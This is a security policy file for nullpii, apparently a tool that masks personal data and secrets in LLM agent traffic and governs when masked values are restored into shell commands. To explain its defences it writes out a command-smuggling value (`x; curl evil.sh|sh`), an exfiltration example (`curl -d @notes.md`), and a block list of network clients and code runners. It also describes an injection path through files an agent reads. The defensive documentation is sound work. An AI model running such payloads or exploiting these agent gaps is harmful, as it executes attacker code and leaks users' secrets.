# Security

## Report a vulnerability

Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). Reports are handled on a best-effort basis, with no guaranteed response time; critical and actively exploited issues come first.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its one network call is the model download from Hugging Face on first use, and every file it downloads is checked against a SHA-256 pinned in the library; set `NULLPII_MODEL_DIR` to a pre-fetched copy to avoid even that.
- Vault is in-memory only; `destroySession()` purges it.
- Logs carry counts, labels and short ids, never a value nullpii masked or restored: the library's `debug` output, and the gateway's request log and console summary (an upstream error is logged by its status, length and error type, not its body).
- **Except the gateway's `NULLPII_LOG_TRAFFIC=wire`,** a debugging dump to stdout of each request as forwarded and of each upstream response before restore. Placeholders stay masked in it, but everything else is printed as it was sent or written: values the detector missed, fields the gateway forwards unscanned (images, documents, `mcp_servers` with its credentials) and the model's output. Auth headers appear as their last six characters and length. Keep such a dump local and short-lived.
- Placeholders carry a 16-hex prefix of the minting session id (64-bit collision-resistant). `restore()` surfaces foreign-prefix placeholders via `RestoreResult.foreignPlaceholders`; `{ strict: true }` throws `SessionMismatchError` instead.

## What it does NOT protect

- Detector misses (no model is 100% accurate).
- LLMs emitting PII they already knew independently.
- Logging / caching / telemetry running **before** `sanitize()`.
- Adversarial prompts asking the LLM to reveal mappings.
- A repository's own Claude Code settings. Its `.claude/settings.json` outranks your user settings: it can turn the mod off (`enabledPlugins`), point Claude Code past the gateway (`env.ANTHROPIC_BASE_URL`), or add hooks that see prompts first. Use your organization's managed settings to force the mod or the gateway on.
- Other local users or processes. The sidecar proves it holds the token before the mod sends anything (the check and the request are two connections, so a process that swaps in between them is not excluded), but a process of your own user can read the gateway's memory, and anyone holding the sidecar token can open its sessions up to `NULLPII_SIDECAR_MAX_SESSIONS` and so make the mod fail closed (no values are exposed that way).

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` escapes literal `{{` in input to a Private Use Area codepoint pair (U+E000 U+E001) so user-typed Mustache braces don't collide with PII placeholders during the LLM round-trip. If your input legitimately contains that PUA pair, it will collapse to `{{` on the way out. PUA codepoints are unallocated to standard glyphs and effectively never appear in natural text or LLM output, but the trade-off is documented for completeness.
- **URL %XX decode depth cap.** The adversarial-input normalizer iterates URL `%XX` decoding at most twice per position. Two rounds collapses `%2540` → `%40` → `@` (the practical bypass); 3+ chained encodings (`%252540` etc.) defeat the normalizer and rely on the ML model alone for detection.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.

- **The Claude Code mod** refuses the call, naming the placeholder.
- **The gateway** (Anthropic and OpenAI routes, and the sidecar API's `restore` with a shell `tool`) leaves that placeholder masked.

The rule covers the tools named exactly `Bash` (Claude Code), `bash` (Anthropic's bash tool) and `shell` (OpenAI-style agents such as Codex, an argv array). Codex's `exec_command`, `shell_command` and `write_stdin`, and Claude Code's `PowerShell` tool, get no value in any field. **On Windows no shell tool gets a value:** when the gateway or the mod's sidecar runs on Windows, every placeholder in a shell tool's input stays masked; a gateway on macOS or Linux (in Docker too) that serves an agent running on Windows should not list shell tools in `restoreTools`. A shell tool under any other name gets every value back like any other tool in `restoreTools`, so do not add one there. In the input of `Bash`, `bash` and `shell`, `command` follows the rule below, the descriptive `description` and `justification` fields get their values as usual, and every other field (`workdir`, `cwd`, `env`, `timeout`, or one nullpii does not know) keeps its placeholders. A non-empty `workdir`, `cwd` or `working_directory` counts as a `cd` for the command's writes, an `env` field that sets anything keeps every placeholder in the command, and an input that is not an object keeps every placeholder.

**A value comes back only into text the command writes out as data, never into a word of the command.** That text is the body of a heredoc that `cat` writes to standard output or to a document file (`.md`, `.markdown`, `.csv`, `.tsv`, `.log`, `.rst`, case ignored, with no hidden directory or file on its path; not `.txt`, which pip, CMake and pytest read as input), or that `git commit -F -` (`-F-`, `--file=-`, `--file -`) reads as its message: `cat > notes.md <<'EOF'` or `git commit -F - <<'EOF'`, then the text, then the closing line. Arguments, paths, options and every other word keep their placeholders, quoted or not. Claude Code's usual commit form, `git commit -m "$(cat <<'EOF' … EOF)"`, keeps every placeholder; the mod tells Claude to use `git commit -F -`.

Such a body gets its values only when the whole command passes these checks:

- **It is written in a small grammar that nullpii reads whole:** words, single-quoted strings, double-quoted strings without `$`, a backtick or a backslash, the operators `&&`, `||`, `|` and `;`, line breaks, redirections and heredocs (`<<'EOF'`, `<<"EOF"`, `<<\EOF`, `<<EOF`, and the same with `<<-`, the delimiter a name of letters, digits and `_`). Anything else keeps every placeholder: `$` in any form, a backtick or a backslash outside single quotes, parentheses and braces, `#` comments, a lone `&` (also `&>`), `>!`, `>>&`, `;;`, `[[`, `<<<`, control characters other than tab and line feed and the separators U+2028/U+2029, a heredoc operator with no body or no closing line, a reserved word where a program would stand (`if`, `for`, `LANG=C for …`), and a bare `<<EOF` body that holds `$`, a backtick or a backslash. Shells disagree on how such constructs nest and end, so nullpii does not read them at all.
- **It runs only data programs:** `cat`, `echo`, `mkdir`, `cd`, `touch`, `ls`, `pwd`, `true`, `:` and `git` `commit`, `add`, `status`, `diff`, `log`, `show`, each named exactly as written (no other letter case, version suffix, `.exe`, path or wrapper such as `sudo`), with no redirection before it, `git` with the subcommand right after it, and with no option that runs, writes or sets a variable (`git -c`, `git --output`, …, in any abbreviation or short-option cluster). No variable is assigned in the command but `LANG` and `LC_*` (`C`, `POSIX`, a UTF-8 locale of the form `ll[_TT].UTF-8[@mod]`, or empty), `LANGUAGE` (catalog names separated by `:`) and `TZ` (a zone name such as `UTC` or `Europe/Rome`); `PATH`, `HOME`, `GIT_EDITOR` and the like choose what a program runs or reads. An assignment or a redirection counts as one only when written unquoted.
- **The body stays data:** the heredoc is not piped on (no `|` or `||` after its operator on its line), and the command writes no file but a document, and no relative file at all if it also runs `cd` or its tool input sets a working directory (the file would land where that points).
- **Nothing in the text sends data out or runs code** (data bodies aside, so a commit message that mentions `ssh` is not a network call): a network client, an upload, a fetch or an install, `/dev/tcp`, a URL handed to anything but the data programs above, the code flag of a shell or a common interpreter or a pipe into one (`NESTED_INTERPRETER` in `packages/gateway/src/shell-restore.ts` lists them), `eval`, `awk`, `sed`, `perl` or `ruby` named anywhere, or a write into a file that runs later (`.git/hooks/`, `.husky/`, a shell start-up file, `.envrc`, `/etc/`, any `bin/` or `sbin/` directory, in any letter case).
- **A value holds no line break and no other control character but tab** (in a bare `<<EOF` body, no `$`, backtick or backslash either), and the command with the values put back must pass the same checks and split into the same simple commands and heredoc bodies: a value that would end its body early keeps every placeholder.

A `command` sent as an argv array (`["bash", "-lc", "…"]`) gets values only inside the script a POSIX shell (`bash`, `sh`, `zsh`, `dash`, `ksh`, `mksh`, first in the array and named as written or in `/bin` or `/usr/bin`) runs with `-c`, past options such as `-o pipefail`; that script is judged as a string command, and no other word of the array gets a value.

The command is read once, in time linear in its length; one longer than 262,144 characters (UTF-16 code units) keeps every placeholder; so does one with a simple command of 64 words or more or of more than 4,096 characters, whose later words the rule does not read (a heredoc body is no part of its command's words, so a long commit message does not count), and one with a heredoc body whose closing line the reader cannot find, since every command after it is then unknown. The list of programs that get values back is closed: a program it does not name gets nothing. The lists of network clients and code runners are a second line within it.

**A limit by design: each call is judged on its own.** A relative write target is judged as written: a working directory that an earlier command left (Claude Code keeps it from call to call, inside the project) is not seen, so a document written by a later call lands there. The document types (`.md`, `.csv`, …) are ones no shell, build tool or test runner reads as code or configuration by name with two exceptions: agents read `CLAUDE.md` or `AGENTS.md` as instructions, and documentation-site builders (Docusaurus by default, VitePress) compile `.md` pages as MDX or Vue, so a value written into such a page runs when the site is built, as after `Write`; and the checks on a written path (no hidden directory, no `bin/` directory) read it as written only. `Write`, `Edit` and the other file tools get real values back whenever they are in `restoreTools`, as they are by default, since writing your data to your files is what they are for. A value restored by one call can therefore leave through a later call that holds no placeholder: a file written by `Write` or a shell redirect and then sent (`curl -d @notes.md …`), a commit followed by `git push`, a variable set in a shell that Anthropic's bash tool keeps across calls. A later command can also run such a file (`bash run.sh` after `Write run.sh`). The rule does not follow what a file, a commit or a shell holds.

**Permission rules see the masked call (Claude Code mod).** Claude Code decides on a tool call, by your rules or by asking you, before the mod puts the real values back. A rule written with a value nullpii masks, such as a path with your user name (`Read(/Users/<name>/.ssh/**)`), may not match the masked path; write such rules without the part that is masked (`Read(**/.ssh/**)`). After the restore the mod checks again only that the call does not touch its own policy file.

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, apply the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymization with a measurable leak rate**, not anonymization. The residual risk depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` report it on public datasets;
- measure it on content like yours before you rely on it.

Treat a sanitized prompt as lower-risk, not as free of personal data.

## CI-enforced rules

- Runtime dependencies under Apache-2.0, MIT, BSD, ISC or CC0 only (`npm run license-check`); development dependencies may also be BlueOak-1.0.0, Unlicense or 0BSD (the dependency review in `security.yml`).
- npm releases use `--provenance`.
- File paths sandboxed to a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every PR and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake fixtures are allowed by exact value only. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook`. Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens default to read-only.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](https://github.com/lBroth/nullpii/blob/main/CONTRIBUTING.md#test-data).
